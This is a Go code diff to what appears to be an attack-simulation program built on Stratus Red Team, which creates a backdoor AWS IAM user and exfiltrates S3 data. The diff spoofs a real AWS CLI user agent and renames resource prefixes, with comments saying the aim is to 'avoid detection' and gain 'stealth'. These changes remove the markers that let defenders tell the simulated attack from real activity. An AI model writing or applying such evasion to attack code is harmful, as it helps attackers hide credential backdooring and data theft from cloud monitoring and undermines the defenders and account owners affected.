@@ -17,6 +17,7 @@ import (
 	"github.com/aws/aws-sdk-go-v2/service/s3"
 	"github.com/aws/smithy-go/middleware"
 	smithyhttp "github.com/aws/smithy-go/transport/http"
+	"github.com/datadog/stratus-red-team/v2/pkg/stratus/useragent"
 	"github.com/google/uuid"
 )
 
@@ -53,8 +54,8 @@ func createAWSConfigWithBackdoorCredentials(accessKeyID, secretAccessKey string,
 			if !ok {
 				return out, metadata, fmt.Errorf("unknown transport type %T", input.Request)
 			}
-			// Use a similar user agent pattern to Stratus Red Team
-			userAgent := fmt.Sprintf("stratus-red-team/%s scenario-execution", uniqueID.String())
+			// Use a realistic AWS CLI user agent to avoid detection
+			userAgent := fmt.Sprintf("aws-cli/2.13.25 Python/3.11.5 Linux/5.15.0-84-generic source/x86_64.ubuntu.22.04 prompt/off command/s3.sync")
 			request.Header.Set("User-Agent", userAgent)
 			return next.HandleBuild(ctx, input)
 		})
@@ -87,6 +88,9 @@ func createAWSConfigWithBackdoorCredentials(accessKeyID, secretAccessKey string,
 const SCENARIO_PREFIX = "security-audit"
 
 func main() {
+	// Set realistic user agent prefix for all stratus techniques to avoid detection
+	useragent.SetUserAgentPrefix("aws-cli")
+
 	log.Println("Starting IAM-to-S3 exfiltration scenario...")
 
 	// Stage 1: Create backdoor IAM user and capture credentials
@@ -216,9 +220,10 @@ func setupS3Backdoor() (string, error) {
 	// Try to extract bucket name from warmup or detonate output
 	combinedOutput := string(warmupOutput) + string(detonateOutput)
 
-	// Look for common bucket name patterns
+	// Look for common bucket name patterns (updated for stealth)
 	patterns := []string{
-		`stratus-red-team-[a-z0-9-]+`,
+		`security-audit-[a-z0-9-]+`, // Our custom prefix
+		`aws-cli-[a-z0-9-]+`,        // If stratus uses our new prefix
 		`S3 bucket ([a-z0-9-]+) ready`,
 		`bucket ([a-z0-9-]+)`,
 		`([a-z]+-[a-z]+-[a-z]+-[a-z0-9]+)`, // Pattern like log-data-ops-txstdcdopm
